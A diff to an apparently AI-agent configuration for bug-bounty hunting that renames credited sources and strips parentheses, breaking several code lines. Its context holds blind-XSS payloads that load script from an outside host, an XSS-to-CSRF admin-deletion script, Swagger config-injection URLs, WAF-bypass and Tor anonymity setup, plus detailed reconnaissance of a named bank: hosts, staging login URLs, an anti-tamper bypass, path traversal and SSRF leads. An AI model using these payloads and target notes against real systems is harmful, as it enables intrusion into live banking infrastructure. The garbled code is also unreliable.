@@ -38,7 +38,7 @@
 │   ├── training/                ← Security training
 │   └── go/                      ← Go module cache
 ├── scripts/                     ← 45+ security automation scripts
-│   ├── lostfuzzer.sh            ← gau→uro→httpx→nuclei pipeline
+│   ├── passive_fuzzer.sh            ← gau→uro→httpx→nuclei pipeline
 │   ├── naabutonmap.py           ← Naabu→Nmap converter
 │   ├── agents_launcher.sh       ← Multi-agent session launcher
 │   ├── alienvault.sh            ← OTX URLs
@@ -83,7 +83,7 @@
 ## Agent Triggers
 | Command | Action |
 |---------|--------|
-| `opencode hunt <target>` | Full LostSec bug bounty hunt |
+| `opencode hunt <target>` | Full Community bug bounty hunt |
 | `opencode plan <target>` | Strategic attack planning + internet research |
 | `opencode verify <finding>` | Zero-false-positive re-check + CVSS |
 | `opencode report <finding>` | BugBase-format report generation |
@@ -104,7 +104,7 @@ Each agent reads `~/.config/opencode/agent_memory/<agent>.md` at session start:
 # PART 3: HUNTER AGENT (Full Definition)
 
 ## Role
-Professional bug bounty hunter using LostSec (coffinxp) methodology. Precision recon, deep analysis, surgical WAF bypass.
+Professional bug bounty hunter using Community methodology methodology. Precision recon, deep analysis, surgical WAF bypass.
 
 ## Core Pipeline
 ```
@@ -261,7 +261,7 @@ Every finding → `~/recon_reports/companies/<program>/unreported/` with:
 
 ## Mistake: 2026-07-05 — Anonymity Stack Deployment Crashed Internet
 - **Error**: Deployed anonymity stack without verification. Tor config had deprecated options (NumEntryGuards, NumDirectoryGuards, DNSListenAddress). iptables OUTPUT policy set to DROP but never verified. UFW allowed port 443 for Tor bootstrap but defeated kill switch.
-- **Fix**: 
+- **Fix**:
   1. Always `tor --verify-config` BEFORE restarting Tor
   2. Always verify iptables with `iptables -L | head -5`
   3. Never use `ufw allow out to any port 443` — use `-m owner --uid-owner debian-tor`
@@ -293,8 +293,8 @@ STEP 3: CONFIGURE FIREWALL (only after Tor verified working)
   └── VERIFY: sudo iptables -L OUTPUT | head -1
 
 STEP 4: TEST KILL SWITCH
-  ├── RUN: curl -s --max-time 3 https://httpbin.org/ip  (FAIL)
-  └── RUN: proxychains4 curl -s https://httpbin.org/ip  (WORK)
+  ├── RUN: curl -s --max-time 3 https://httpbin.org/ip (FAIL)
+  └── RUN: proxychains4 curl -s https://httpbin.org/ip (WORK)
 
 STEP 5: EMERGENCY ROLLBACK
   ├── sudo systemctl reset-failed tor@default
@@ -328,7 +328,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 2. **Lastmile Web**: `https://lastmilewebuat.hdfcuat.bank.in/IndiaLinkWeb/` (Indialink 2.0 login)
 3. **CBX Web**: `https://cbxuat.hdfcbank.com:444/cbx/` → redirects to `https://cbxuat.hdfcuat.bank.in:444/cbx/`
 4. SME Web (VPN needed)
-5. CorpCards (VPN needed)  
+5. CorpCards (VPN needed)
 6. ENET CorpSSL (VPN needed)
 7. BizExpress (VPN needed)
 8. CLO (VPN needed)
@@ -344,7 +344,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 ### Key Discovery Paths
 
 #### CBX (Corporate Netbanking)
-- **OTL Anti-Tamper Bypass**: `fetch()` API bypasses OTL completely (XHR only)
+- **OTL Anti-Tamper Bypass**: `fetch` API bypasses OTL completely (XHR only)
 - **OTL Whitelisted Endpoints** (no tamper wrapping): `forgotpassword`, `postlogingeneratesalt`, `transactionCode`
 - **Potential Path Traversal**: `/cbx/..%252f` returns 500 (double-encoded)
 - **CSP connect-src allows localhost SSRF**: `https://localhost:9999`, `https://localhost:19999`, `https://localhost:29999`
@@ -364,7 +364,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 
 ### Saved Findings
 - `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Bypass_fetch_API_*.md`
-- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Deep_Analysis_*.md`  
+- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Deep_Analysis_*.md`
 - `~/recon_reports/companies/hdfc/unreported/CBX_Path_Traversal_500_*.md`
 - `~/recon_reports/companies/hdfc/unreported/CSP_SSRF_CBX_*.md`
 - `~/recon_reports/companies/hdfc/unreported/Indialink_Client_Side_Encryption_*.md`
@@ -483,7 +483,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 - `ENET_Captcha_SQLi_Error_Analysis_*.md` — Captcha bypass attempts
 - `ENET_Hardcoded_Hashrand_*.md` — (superseded - hashrand is dynamic per request)
 - `ENET_Login_Flow_Analysis_*.md` — Login flow mapping
-- `CBX_OTL_Bypass_fetch_API_*.md` — fetch() bypasses OTL
+- `CBX_OTL_Bypass_fetch_API_*.md` — fetch bypasses OTL
 - `CBX_OTL_Deep_Analysis_*.md` — Full OTL JS analysis v1.21.4.26
 - `CBX_Path_Traversal_500_*.md` — Initial ..%252f finding
 - `CBX_iportal_Accessible_Assets_*.md` — Static asset enumeration
@@ -579,7 +579,7 @@ Must reproduce 2/3. If not → REJECT as transient.
 | SQLi | Error has SQL syntax / information_schema / delayed | Generic "An error occurred" |
 | XSS | Playwright executes JS | `<` becomes `&lt;` |
 | Reflected XSS | Payload unescaped + browser executes | `<` becomes `&lt;` |
-| DOM XSS | Playwright confirms alert() fires | Regex check cant confirm DOM |
+| DOM XSS | Playwright confirms alert fires | Regex check cant confirm DOM |
 | SSRF | Callback received OR internal data in response | Payload echoed back |
 | LFI | /etc/passwd visible | Only error message |
 | SSTI | `{{7*7}}` returns "49" | Raw string `{{7*7}}` |
@@ -593,7 +593,7 @@ Must reproduce 2/3. If not → REJECT as transient.
 ### Step 7: Browser Validation (XSS)
 ```bash
 # Use Playwright to confirm actual JS execution
-# If alert() fires → confirmed
+# If alert fires → confirmed
 ```
 
 ### Step 8: False Positive Signature Check
@@ -1049,9 +1049,9 @@ STEP 1: tor --verify-config
 STEP 2: systemctl restart tor@default
 STEP 3: ss -tlnp | grep 9050
 STEP 4: proxychains4 curl https://check.torproject.org/ | grep -o "Congratulations"
-STEP 5: sudo ufw enable  (only AFTER Tor verified)
-STEP 6: curl -s http://ifconfig.me  (should FAIL)
-STEP 7: proxychains4 curl http://ip-api.com/json  (should WORK)
+STEP 5: sudo ufw enable (only AFTER Tor verified)
+STEP 6: curl -s http://ifconfig.me (should FAIL)
+STEP 7: proxychains4 curl http://ip-api.com/json (should WORK)
 ```
 
 ## Emergency Rollback
@@ -1103,8 +1103,8 @@ All aliased through proxychains: `curl`, `wget`, `chaos`, `subfinder`, `httpx`, 
 
 # PART 16: COMPLETE METHODOLOGY LIBRARY (All common/ files inlined)
 
-## 16.1 LOSTSEC WORKFLOW — Core Pipeline
-**Source**: LostSec (coffinxp) Medium, Mar 2026
+## 16.1 WORKFLOW — Core Pipeline
+**Source**: Community methodology Medium, Mar 2026
 
 ### Full One-Liner
 ```bash
@@ -1287,7 +1287,7 @@ ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FI
 ### Custom Scripts (~/scripts/)
 | Script | Purpose |
 |--------|---------|
-| lostfuzzer.sh | gau→uro→httpx→nuclei pipeline |
+| passive_fuzzer.sh | gau→uro→httpx→nuclei pipeline |
 | alienvault.sh | Fetch URLs from AlienVault OTX |
 | naabutonmap.py | Naabu→Nmap vuln scanning |
 | dorking.py | Google dorking automation |
@@ -1306,9 +1306,9 @@ ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FI
 | Repo | Stars | Content |
 |------|-------|---------|
 | jhaddix/tbhm | 4357⭐ | Full Bug Hunter Methodology |
-| coffinxp/loxs | 1600⭐ | Multi-vuln scanner (LostSec) |
-| coffinxp/GFpattren | 189⭐ | GF patterns |
-| coffinxp/customBsqli | 141⭐ | Blind SQLi automation |
+| loxs | 1600⭐ | Multi-vuln scanner (Community) |
+| GFpattren | 189⭐ | GF patterns |
+| customBsqli | 141⭐ | Blind SQLi automation |
 
 ### WAF Bypass Quick Reference
 1. `wafw00f https://target.com` — identify WAF vendor
@@ -1853,7 +1853,7 @@ done
 **Pattern 3: XSS → CSRF → Admin Action** (Med+Med=Crit, $3K-$15K)
 ```html
 <script>
-fetch('/admin/delete-user').then(r => r.text()).then(html => {
+fetch('/admin/delete-user').then(r => r.text).then(html => {
   const token = html.match(/csrf_token=([^"']+)/)[1];
   fetch('/admin/delete-user', {method:'POST', body:'user_id=1&csrf_token='REDACTED_ASSIGNED_SECRET"include'});
 });
@@ -2276,7 +2276,7 @@ Payloads stored in places you cant see (admin panels, email templates, logs, cha
 # XSSHunter (free: bxsshunter.com)
 # Burp Collaborator (Burp Pro)
 # interactsh (ProjectDiscovery, self-hosted)
-# xss.report (LostSec/coffinxp)
+# xss.report (Community)
 ```
 
 ### Burp Match & Replace (Automated)
@@ -2284,14 +2284,14 @@ Replace User-Agent header with payload — every request carries blind XSS paylo
 
 ### Automation
 ```bash
-cat urls.txt | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
 cat urls.txt | gf xss | uro | dalfox pipe --blind https://collaborator --waf-bypass --silence
-subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/Community></script>' -parameters
 ```
 
 ### EXIF/XSS via Image Metadata
 ```bash
-exiftool -Comment='"><script src=https://xss.report/c/coffinxp></script>' image.jpg
+exiftool -Comment='"><script src=https://xss.report/c/Community></script>' image.jpg
 ```
 
 ### Where to Inject Headers
@@ -2303,7 +2303,7 @@ User-Agent, X-Forwarded-For, Referer, X-Forwarded-Host, Cookie
 - Split across multiple fields
 - SVG/iframe vectors instead of `<script>`
 - String.fromCharCode obfuscation
-- atob() base64
+- atob base64
 
 ### Reporting Tips
 - Include screenshot of blind XSS callback dashboard
@@ -2445,12 +2445,12 @@ https://target.com/swagger?url=https://attacker.com/openapi.yaml
 
 **Open Redirect via OAuth2:** Supply crafted authorizationUrl → click Authorize redirects to attacker
 
-### Testing Payloads (from coffinxp/swagger)
+### Testing Payloads (from swagger)
 ```bash
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsstest.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsscookie.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/login.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/rlogin.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsstest.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsscookie.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/login.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/rlogin.json
 ```
 
 ### Discovery
@@ -2652,7 +2652,7 @@ Headers: Location, Set-Cookie, X-Forwarded-For, Referer
 
 ### Discovery
 ```bash
-# Loxs tool (coffinxp/loxs)
+# Loxs tool (loxs)
 loxs -l urls.txt -crlf
 
 # Manual
@@ -2734,7 +2734,7 @@ curl -sk "https://target.com/chunk.js" -o /tmp/analyze.js
 ### Pattern Searching
 ```python
 import re
-c = open("/tmp/analyze.js").read()
+c = open("/tmp/analyze.js").read
 
 # API endpoints
 for m in re.findall(r'["\'](/v[12]/[^"\']+)["\']', c):
@@ -2750,7 +2750,7 @@ for m in re.findall(r'(?:key|secret|token|api[_-]?key)[:=]["\']?([A-Za-z0-9_\-]{
 
 # Routes
 for m in re.findall(r'["\'](/[a-z-]+(?:/[a-z-]+)*)["\']', c):
-    if any(x in m.lower() for x in ['api', 'auth', 'order', 'admin']):
+    if any(x in m.lower for x in ['api', 'auth', 'order', 'admin']):
         print(f"Route: {m}")
 ```
 
@@ -2872,7 +2872,7 @@ echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc 127.0.0.1 9051
 chaos -d target.com -o subs.txt && httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt
 
 # Quick fuzzing
-bash ~/scripts/lostfuzzer.sh
+bash ~/scripts/passive_fuzzer.sh
 
 # Multi-agent launch
 bash ~/scripts/agents_launcher.sh
@@ -2901,7 +2901,7 @@ opencode memory <agent>
 1. **Mass subdomain recon**: subfinder on 6 HDFC domains → 2746 unique subdomains
 2. **httpx probing**: 812 live hosts found (206 with HTTP 200)
 3. **Deep dives on high-value targets**:
-   - WebLogic (oracle.hdfc.bank.in) → 503 backend 
+   - WebLogic (oracle.hdfc.bank.in) → 503 backend
    - ManageEngine Desktop Central (corporateportal.hdfc.bank.in) → 503 backend
    - Spring Boot Admin (remote.hdfc.bank.in) → 503 backend
    - CloudPanel (admin.hdfc.bank.in) → 503 backend
@@ -2914,7 +2914,7 @@ opencode memory <agent>
    - Allows enumerating valid merchant usernames/emails
    - Rate limited (10 min lockout after 0 attempts)
 5. **BizExpress (netbankingforbusiness.hdfc.bank.in)**:
-   - Angular SPA (Angular 17+) 
+   - Angular SPA (Angular 17+)
    - Backend: Open Money platform (bankopen.co)
    - APIs: icp-api.bankopen.co, payments.open.money, uat-lending.bankopen.co
 6. **Drupal API Portal (developer.hdfc.bank.in)**:
@@ -2922,7 +2922,7 @@ opencode memory <agent>
    - Open partner registration with CAPTCHA
    - 4 API categories with documentation
 7. **ENET**: Currently down (HTTP 000)
-8. **CBX**: 000 timeout  
+8. **CBX**: 000 timeout
 9. **SME CLO**: 503
 
 ### New Findings Saved (3 total this session)
